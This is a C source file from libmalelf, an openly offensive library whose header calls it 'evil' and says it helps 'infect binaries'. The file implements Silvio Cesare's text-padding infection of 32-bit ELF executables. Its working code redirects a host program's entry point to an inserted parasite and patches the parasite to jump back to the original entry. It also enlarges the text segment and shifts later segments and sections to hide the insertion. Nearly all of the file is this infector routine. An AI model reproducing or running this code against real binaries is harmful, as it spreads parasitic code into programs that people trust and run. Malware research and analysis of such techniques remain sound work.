/*
 * The libmalelf is an evil library that could be used for good! It was
 * developed with the intent to assist in the process of infecting
 * binaries and provide a safe way to analyze malwares.
 *
 * Evil using this library is the responsibility of the programmer.
 *
 * Author:
 *         Tiago Natel de Moura <natel@secplus.com.br>
 *
 * Contributors:
 *         Daniel Ricardo dos Santos <danielricardo.santos@gmail.com>
 *         Paulo Leonardo Benatto    <benatto@gmail.com>
 *
 * Copyright 2012, 2013 by Tiago Natel de Moura. All Rights Reserved.
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 * http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or
 * implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 *
 */

#include <stdio.h>
#include <stdlib.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <unistd.h>
#include <errno.h>
#include <assert.h>

#include <malelf/types.h>
#include <malelf/infect.h>
#include <malelf/util.h>
#include <malelf/error.h>
#include <malelf/binary.h>
#include <malelf/patch.h>
#include <malelf/debug.h>

#define PAGE_SIZE 4096

typedef struct {
        MalelfBinary *host;
        MalelfBinary *parasite;
        _u32 host_entry_point;
        _u32 parasite_entry_point;
        _u32 infect_offset_at;
        _u32 parasite_vaddr;
        _u32 target_segment;
} MalelfInfect;

static _u8 _malelf_infect_silvio_padding(MalelfBinary* input,
                                  MalelfBinary* output,
                                  unsigned int end_of_text,
                                  MalelfBinary* parasite,
                                  _u32 offset_entry_point,
                                  unsigned old_e_entry,
                                  _u32 magic_bytes) {
        _u8 error;
        unsigned int c;
        char *parasite_data = (char*) parasite->mem;

        MALELF_DEBUG_INFO("Inserting parasite\n");

        if ((error = malelf_binary_openw(output, output->fname))
            != MALELF_SUCCESS) {
                MALELF_DEBUG_ERROR("Failed to open file '%s' for write.",
                                   output->fname);
                return error;
        }

        if ((c = write(output->fd,
                       input->mem,
                       end_of_text)) != end_of_text) {
                return errno;
        }

        if (offset_entry_point == 0) {
                if ((error = malelf_patch_binary_at_magic_byte(parasite,
                                                              magic_bytes,
                                                              old_e_entry))
                    != MALELF_SUCCESS) {
                        return error;
                }
        } else {
                if ((error = malelf_patch_binary_at(parasite,
                                                   offset_entry_point,
                                                   old_e_entry)) != MALELF_SUCCESS) {
                        return error;
                }
        }

        if ((c = write(output->fd,
                       parasite_data,
                       parasite->size))
            != (unsigned)parasite->size) {
                return errno;
        }

        if((c = lseek(output->fd,
                      PAGE_SIZE - parasite->size,
                      SEEK_CUR)) != end_of_text + PAGE_SIZE) {
                return errno;
        }

        input->mem += end_of_text;

        /* unsigned int sum = end_of_text + PAGE_SIZE; */
        unsigned int last_chunk = input->size - end_of_text;

        if ((c = write(output->fd, input->mem, last_chunk)) != last_chunk) {
                return errno;
        }

        MALELF_DEBUG_INFO("Successfully infected: %s\n", output->fname);
        return MALELF_SUCCESS;
}

_u32 _malelf_infect_prepare_silvio_padding32(MalelfInfect *infector)
{
        Elf32_Ehdr *host_ehdr;
        Elf32_Phdr *host_phdr, *phdr;
        MalelfBinary *host;
        _i32 text_found = -1;
        _u32 i = 0;

        assert (NULL != infector &&
                NULL != infector->host &&
                NULL != infector->parasite);

        host = infector->host;

        host_ehdr = (Elf32_Ehdr *) MALELF_ELF_DATA(&host->ehdr);
        host_phdr = (Elf32_Phdr *) MALELF_ELF_DATA(&host->phdr);

        for (phdr = host_phdr, i = host_ehdr->e_phnum;
             i-- > 0;
             phdr++) {
                if (text_found != -1) {
                        /* TODO: shift segments ... */
                        continue;
                } else if (phdr->p_type == PT_LOAD &&
                           phdr->p_flags == (PF_X | PF_R)) {
                        text_found = (host_ehdr->e_phnum - i) - 1;
                        infector->parasite_entry_point =
                                (phdr->p_vaddr + phdr->p_filesz);
                        infector->host_entry_point = host_ehdr->e_entry;
                        infector->infect_offset_at =
                                (phdr->p_offset + phdr->p_filesz);
                }
        }

        if (text_found == -1) {
                MALELF_DEBUG_ERROR("TEXT segment not found in binary "
                                   "'%s'.", host->fname);
                return MALELF_ETEXT_SEG_NOT_FOUND;
        }

        infector->target_segment = text_found;
        return MALELF_SUCCESS;
}

_u32 malelf_infect_silvio_padding32_new(MalelfBinary *host,
                                     MalelfBinary *output,
                                     MalelfBinary *parasite,
                                     _u32 offset_entry_point,
                                     _u32 magic_bytes)
{
        _u32 i;
        _u32 error = MALELF_SUCCESS;
        MalelfInfect infector;
        Elf32_Ehdr *host_ehdr;
        Elf32_Phdr *host_phdr;
        Elf32_Shdr *host_shdr;
        Elf32_Phdr *target_phdr;
        _u32 parasite_end_offset = 0;

        infector.host = host;
        infector.parasite = parasite;

        error = _malelf_infect_prepare_silvio_padding32(&infector);
        if (MALELF_SUCCESS != error) {
                return error;
        }

        host_ehdr = host->ehdr.uhdr.h32;
        host_phdr = host->phdr.uhdr.h32;
        host_shdr = host->shdr.uhdr.h32;

        /* patch entry point */
        host_ehdr->e_entry = infector.parasite_entry_point;

        target_phdr = host_phdr + infector.target_segment;
        assert (target_phdr->p_type == PT_LOAD);
        assert (target_phdr->p_flags == (PF_X | PF_R));

        target_phdr->p_filesz += parasite->size;
        target_phdr->p_memsz += parasite->size;

        /* shift every segment after TEXT segment */
        for (i = infector.target_segment + 1;
             i < host_ehdr->e_phnum;
             i++) {
                Elf32_Phdr *phdr = host_phdr + i;
                phdr->p_offset += PAGE_SIZE;
        }

        parasite_end_offset = infector.infect_offset_at +
                parasite->size;

        /* Increase offset of every section after injection
         * by page size
         */
        for (i = host_ehdr->e_shnum; i-- > 0; host_shdr++) {
                if (host_shdr->sh_offset >= parasite_end_offset) {
                        host_shdr->sh_offset += PAGE_SIZE;
                } else {
                        /* increase the size of section that contains
                           the parasite */
                        if (host_shdr->sh_size + host_shdr->sh_addr ==
                            infector.parasite_vaddr) {
                                host_shdr->sh_size += parasite->size;
                        }
                }

        }

        host_ehdr->e_shoff += PAGE_SIZE;

        MALELF_DEBUG_INFO("Text segment starts at 0x%08x\n",
                          target_phdr->p_vaddr);
        MALELF_DEBUG_INFO("Patched entry point from 0x%x to 0x%x\n",
                          infector.host_entry_point,
                          infector.parasite_entry_point);
        MALELF_DEBUG_INFO("Inserting parasite at offset %x vaddr 0x%x\n",
                          infector.infect_offset_at,
                          infector.parasite_vaddr);

        error = _malelf_infect_silvio_padding(host,
                                              output,
                                              infector.infect_offset_at,
                                              parasite,
                                              offset_entry_point,
                                              infector.host_entry_point,
                                              magic_bytes);

        return error;
}

_u8 malelf_infect_silvio_padding32(MalelfBinary *input,
                                   MalelfBinary *output,
                                   MalelfBinary *parasite,
                                   _u32 offset_entry_point,
                                   _u32 magic_bytes)
{
        int i;
        _i32 error = MALELF_SUCCESS;
        char text_found;
        Elf32_Ehdr *ehdr;
        Elf32_Shdr *shdr;
        Elf32_Phdr *phdr;

        unsigned int after_insertion_offset = 0;
        unsigned int end_of_text = 0;
        unsigned long int old_e_entry = 0;
        unsigned long parasite_vaddr = 0;
        unsigned long text = 0;

        text_found = 0;

        ehdr = input->ehdr.uhdr.h32;
        phdr = input->phdr.uhdr.h32;
        shdr = input->shdr.uhdr.h32;

        for (i = ehdr->e_phnum; i-- > 0; phdr++) {
                if (text_found) {
                        /* shift every segment after the text
                           segment by PAGE_SIZE */
                        phdr->p_offset += PAGE_SIZE;
                        continue;
                } else {
                        if(phdr->p_type == PT_LOAD) {
                                /* TEXT SEGMENT */
                                if (phdr->p_flags == (PF_R | PF_X)) {
                                        text = phdr->p_vaddr;
                                        parasite_vaddr = phdr->p_vaddr + phdr->p_filesz;

                                        /* save old entry point to jmp later */
                                        /* and patch entry point to our new entry */
                                        old_e_entry = ehdr->e_entry;
                                        ehdr->e_entry = parasite_vaddr;
                                        end_of_text = phdr->p_offset + phdr->p_filesz;
                                        /* increase memsz and filesz */
                                        phdr->p_filesz += parasite->size;
                                        phdr->p_memsz += parasite->size;
                                        after_insertion_offset = phdr->p_offset + phdr->p_filesz;
                                        text_found++;
                                }
                        }
                }
        }

        if (old_e_entry == 0 || after_insertion_offset == 0) {
                MALELF_DEBUG_ERROR("Failed to get old entry point...\n");
                exit(-1);
        }

        /* Increase offset of any section that resides after injection
         * by page size
         */
        for (i = ehdr->e_shnum; i-- > 0; shdr++) {
                if (shdr->sh_offset >= after_insertion_offset)
                        shdr->sh_offset += PAGE_SIZE;
                else
                        /* increase the size of section that contains
                           the parasite */
                        if (shdr->sh_size + shdr->sh_addr == parasite_vaddr)
                                shdr->sh_size += parasite->size;

        }

        if (!text) {
                MALELF_DEBUG_ERROR("Could not locate text segment, exiting\n");
                exit(-1);
        }

        MALELF_DEBUG_INFO("Text segment starts at 0x%08x\n", (unsigned int) text);
        MALELF_DEBUG_INFO("Patched entry point from 0x%x to 0x%x\n",
                    (unsigned)old_e_entry, (unsigned)ehdr->e_entry);
        MALELF_DEBUG_INFO("Inserting parasite at offset %x vaddr 0x%x\n",
                    (unsigned)end_of_text, (unsigned)parasite_vaddr);

        ehdr->e_shoff += PAGE_SIZE;
        error = _malelf_infect_silvio_padding(input,
                                              output,
                                              end_of_text,
                                              parasite,
                                              offset_entry_point,
                                              old_e_entry,
                                              magic_bytes);

        return error;
}

/**
 * Try to infect the ELF using the text padding technique created
 * by Silvio Cesare.
 * More information:
 * http://www.win.tue.nl/~aeb/linux/hh/virus/unix-viruses.txt
 */
_u8 malelf_infect_silvio_padding(MalelfBinary* input,
                                 MalelfBinary* output,
                                 MalelfBinary* parasite,
                                 _u32 offset_entry_point,
                                 _u32 magic_bytes)
{
        switch (input->class) {
        case MALELF_ELF32:
                return malelf_infect_silvio_padding32(input,
                                                      output,
                                                      parasite,
                                                      offset_entry_point,
                                                      magic_bytes);
        case MALELF_ELF64:
                return MALELF_ERROR;
        }

        return MALELF_ERROR;
}
